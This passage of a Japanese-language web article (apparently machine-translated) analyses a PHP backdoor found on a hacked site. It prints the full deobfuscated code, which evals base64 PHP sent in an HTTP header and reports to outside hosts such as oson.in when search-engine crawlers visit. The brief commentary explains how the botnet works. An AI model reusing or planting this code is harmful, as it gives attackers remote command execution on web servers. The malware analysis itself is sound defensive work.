          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">"determinator"</span></span>)) { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">determinator_feof</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($II1Ill, &amp;$microtime = NULL)</span></span></span><span class="hljs-function"> </span></span>{ $microtime = microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> feof($II1Ill); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getfile</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($domain, $strURL)</span></span></span><span class="hljs-function"> </span></span>{ @ini_set(<span class="hljs-string"><span class="hljs-string">"allow_url_fopen"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@ini_get(<span class="hljs-string"><span class="hljs-string">"allow_url_fopen"</span></span>) == <span class="hljs-string"><span class="hljs-string">"1"</span></span>) { $I111I1=@file_get_contents(<span class="hljs-string"><span class="hljs-string">"http://"</span></span> . $domain . $strURL. <span class="hljs-string"><span class="hljs-string">"&amp;way=file_get_contents"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $I111I1; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">"curl_init"</span></span>)){ $objCURL = @curl_init(); @curl_setopt($objCURL, CURLOPT_URL, <span class="hljs-string"><span class="hljs-string">"http://"</span></span> . $domain . $strURL. <span class="hljs-string"><span class="hljs-string">"&amp;way=curl"</span></span>); @curl_setopt($objCURL, CURLOPT_HEADER,<span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); @curl_setopt($objCURL, CURLOPT_RETURNTRANSFER,<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); @curl_setopt($objCURL, CURLOPT_CONNECTTIMEOUT, <span class="hljs-number"><span class="hljs-number">5</span></span>); $objCURLResult = @curl_exec($objCURL); @curl_close($objCURL); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($objCURLResult)){ $objCURLResult = <span class="hljs-string"><span class="hljs-string">""</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $objCURLResult; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $II1Ill = @fsockopen($domain, <span class="hljs-number"><span class="hljs-number">80</span></span>, $QO0Q0O, $QQ0QO0, <span class="hljs-number"><span class="hljs-number">5</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($II1Ill) { $Ill111 = <span class="hljs-string"><span class="hljs-string">""</span></span>; $microtime = <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span>; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"GET {$strURL}&amp;way=socket HTTP/1.0\r\nHost: {$domain}\r\n"</span></span>); $QOQ00O = PHP_OS.<span class="hljs-string"><span class="hljs-string">"/"</span></span>.PHP_VERSION; @fputs($II1Ill, <span class="hljs-string"><span class="hljs-string">"User-Agent: {$QOQ00O}\r\n\r\n"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(!determinator_feof($II1Ill, $microtime) &amp;&amp; (microtime(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>) - $microtime) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>){ $Ill111 .= @fgets($II1Ill, <span class="hljs-number"><span class="hljs-number">128</span></span>); } @fclose($II1Ill); $Q0OQOQ = explode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Ill111); <span class="hljs-keyword"><span class="hljs-keyword">unset</span></span>($Q0OQOQ[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> implode(<span class="hljs-string"><span class="hljs-string">"\r\n\r\n"</span></span>, $Q0OQOQ); } } } $arrSites = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>(<span class="hljs-string"><span class="hljs-string">"oson.in"</span></span>, <span class="hljs-string"><span class="hljs-string">"ryepdx.com"</span></span>, <span class="hljs-string"><span class="hljs-string">"phpaide.com"</span></span>); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">write</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($strFile,$strDataToWrite)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($objFileDescriptor=@fopen($strFile,<span class="hljs-string"><span class="hljs-string">"w"</span></span>)){ @fwrite($objFileDescriptor,$strDataToWrite); @fclose($objFileDescriptor); } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">output</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($strGETKey, $strGETValue)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"Y_"</span></span>.$strGETKey.<span class="hljs-string"><span class="hljs-string">":"</span></span>.$strGETValue.<span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; } @ini_set(<span class="hljs-string"><span class="hljs-string">"display_errors"</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); define(<span class="hljs-string"><span class="hljs-string">"determinator"</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTPS"</span></span>])){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTPS"</span></span>] != <span class="hljs-string"><span class="hljs-string">"off"</span></span>){ $strHost=<span class="hljs-string"><span class="hljs-string">"https://"</span></span>; } } $strHost.=strtolower(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_HOST"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($_GET <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $strGETKey=&gt;$strGETValue){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($strGETValue,<span class="hljs-string"><span class="hljs-string">"union"</span></span>)){ $_GET[$strGETKey]=<span class="hljs-string"><span class="hljs-string">""</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span> (strpos($strGETValue,<span class="hljs-string"><span class="hljs-string">"select"</span></span>)){ $_GET[$strGETKey]=<span class="hljs-string"><span class="hljs-string">""</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>])) { $_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>] = @$_SERVER[<span class="hljs-string"><span class="hljs-string">"SCRIPT_NAME"</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"QUERY_STRING"</span></span>]) { $_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>] .= <span class="hljs-string"><span class="hljs-string">"?"</span></span> . @$_SERVER[<span class="hljs-string"><span class="hljs-string">"QUERY_STRING"</span></span>]; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($strFullURL=<span class="hljs-string"><span class="hljs-string">"http://"</span></span>.@$_SERVER[<span class="hljs-string"><span class="hljs-string">"REQUEST_URI"</span></span>]) { $strExploitedServerID=@md5(<span class="hljs-string"><span class="hljs-string">"http://"</span></span>.<span class="hljs-string"><span class="hljs-string">"2.19"</span></span>.PHP_OS.<span class="hljs-string"><span class="hljs-string">"QOO00OQQQQ0"</span></span>); $strScriptDirectory=dirname(<span class="hljs-keyword"><span class="hljs-keyword">__FILE__</span></span>).DIRECTORY_SEPARATOR; $arrPotentiallyVulnDirectories = <span class="hljs-keyword"><span class="hljs-keyword">Array</span></span>( <span class="hljs-string"><span class="hljs-string">"/tmp/.font-unix"</span></span>, <span class="hljs-string"><span class="hljs-string">"/tmp/.ICE-unix"</span></span>, @$_SERVER[<span class="hljs-string"><span class="hljs-string">"TMP"</span></span>], @$_SERVER[<span class="hljs-string"><span class="hljs-string">"TEMP"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TMP"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TMPDIR"</span></span>], @$_ENV[<span class="hljs-string"><span class="hljs-string">"TEMP"</span></span>], <span class="hljs-string"><span class="hljs-string">"/tmp"</span></span>, @ini_get(<span class="hljs-string"><span class="hljs-string">"upload_tmp_dir"</span></span>), $strScriptDirectory.<span class="hljs-string"><span class="hljs-string">"tmp"</span></span>, $strScriptDirectory.<span class="hljs-string"><span class="hljs-string">"wp-content/uploads"</span></span>, $strScriptDirectory.<span class="hljs-string"><span class="hljs-string">"wp-content/cache"</span></span>, ); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($arrPotentiallyVulnDirectories <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $strPotentiallyVulnDirectory){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($strPotentiallyVulnDirectory)){ $strPotentiallyVulnDirectory.=DIRECTORY_SEPARATOR; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_writable($strPotentiallyVulnDirectory)){ $strScriptDirectory = $strPotentiallyVulnDirectory; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } $tmp=$strScriptDirectory.<span class="hljs-string"><span class="hljs-string">"."</span></span>.$strExploitedServerID; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_Y_AUTH"</span></span>]==$strExploitedServerID){ <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(<span class="hljs-string"><span class="hljs-string">"versio"</span></span>, <span class="hljs-string"><span class="hljs-string">"2.19"</span></span>.<span class="hljs-string"><span class="hljs-string">"-"</span></span>.<span class="hljs-string"><span class="hljs-string">"ftp13"</span></span>.<span class="hljs-string"><span class="hljs-string">"-php"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($strCommand = base64_decode(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_EXECPHP"</span></span>])){ @<span class="hljs-keyword"><span class="hljs-keyword">eval</span></span>($strCommand); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>; @output(<span class="hljs-string"><span class="hljs-string">"out"</span></span>, <span class="hljs-string"><span class="hljs-string">"ok"</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@is_file($tmp)){ @touch($tmp); @<span class="hljs-keyword"><span class="hljs-keyword">include_once</span></span>($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ $strFullURL=@urlencode($strFullURL); $strUserAgent = @strtolower(@$_SERVER[<span class="hljs-string"><span class="hljs-string">"HTTP_USER_AGENT"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> (explode(<span class="hljs-string"><span class="hljs-string">","</span></span>, <span class="hljs-string"><span class="hljs-string">"google,yahoo,bing,msnbot,ask,baidu,yandex"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $strSearchEngineAgent){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos($strUserAgent, $strSearchEngineAgent)!==<span class="hljs-keyword"><span class="hljs-keyword">False</span></span>){ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (@touch($tmp)){ $strURL = <span class="hljs-string"><span class="hljs-string">"/pg.php?u="</span></span>.$strFullURL.<span class="hljs-string"><span class="hljs-string">"&amp;k="</span></span>.$strExploitedServerID.<span class="hljs-string"><span class="hljs-string">"&amp;t=php&amp;p="</span></span>.<span class="hljs-string"><span class="hljs-string">"ftp13"</span></span>.<span class="hljs-string"><span class="hljs-string">"&amp;v="</span></span>.<span class="hljs-string"><span class="hljs-string">"2.19"</span></span>; $I11lII = getfile($arrSites[<span class="hljs-number"><span class="hljs-number">0</span></span>], $strURL); @touch($tmp); } <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } } } }</code>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
     </pre>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     したがって、このスクリプトの機能は明らかです。if（！Defined（ "determinator"））{include_onceの単純な類似物です。エラーメッセージが原因で、悪意のあるユーザーはアクティビティを表示したくないようです。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     スクリプトはいくつかのユーティリティ関数（ファイルの読み取り/ダウンロードとファイルへの書き込み）を使用しますが、getfileは最初に、curlによる障害の場合、最悪の場合はソケットを介してfile_get_contentsを介してコンテンツを取得しようとします。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      $ ArrSitesは、スクリプトがデータを受信するサイトのリストを格納します。一方、ボットネットの所有者は、検索エンジンの1つからロボットが到着するとすぐに、感染したサイトについて通知されます。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
     実行用のスクリプトがすでに存在する場合、チェックなしで実行されます。 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      <b>その結果、ボットから受信したコマンドを実行し、ファイルをダウンロードできるスクリプトを取得しました。</b> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      PS：解凍後、この<a href="https://gist.github.com/ryepdx/5016252">マルウェアの</a>ソースコードgist.github.com/ryepdx/5016252を見つけました。 </div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../J19067/index.html">ロシアの機械のオンライン取引市場</a></li>
<li><a href="../J190672/index.html">良いプログラマーになるために知っておくべきことはすべて幼稚園で学んだ</a></li>
<li><a href="../J190676/index.html">BMW i8コンセプトレーザーライト</a></li>
<li><a href="../J19068/index.html">エコーの人工言語</a></li>
<li><a href="../J190680/index.html">Airy-サイトのクラウド</a></li>
<li><a href="../J190692/index.html">MicrosoftはSkypeをOutlook.comと統合します</a></li>
<li><a href="../J190694/index.html">自動ワードプロセッシング用の辞書を送信する方法</a></li>
<li><a href="../J190696/index.html">コミュニティは、Facebookに支払いをしなかったハッカーのためにお金を集めます</a></li>
<li><a href="../J190700/index.html">YAMD：JSでモジュールを記述するための別のバイク</a></li>
<li><a href="../J190706/index.html">HTC Desire 600デュアルシム-ダブルベット</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter70218013 = new Ya.Metrika({
                  id:70218013,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/70218013" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'G-FEDBM7F51Q', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Clever Geek | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <div class="company-info js-company-info" itemscope="" itemtype="http://schema.org/Organization">
      <span itemprop="name">Western Town Media (WTM)</span>
      <div itemprop="address" itemscope="" itemtype="http://schema.org/PostalAddress">
        <span itemprop="streetAddress">1968 Stoney Lonesome Road</span>
        <br>
        <span itemprop="postalCode">PA 18640</span>
        <span itemprop="addressLocality">Pittston, USA</span>
      </div>
      <span itemprop="telephone">570-362-1316</span>
    </div>
    <script type="application/ld+json">
      {
        "@context": "http://schema.org",
        "@type": "Organization",
        "address": {
          "@type": "PostalAddress",
          "addressLocality": "Pittston, USA",
          "postalCode": "PA 18640",
          "streetAddress": "1968 Stoney Lonesome Road"
        },
        "name": "Western Town Media (WTM)",
        "telephone": "570-362-1316"
      }
    </script>
  </div>
</footer>
  
</body>

</html>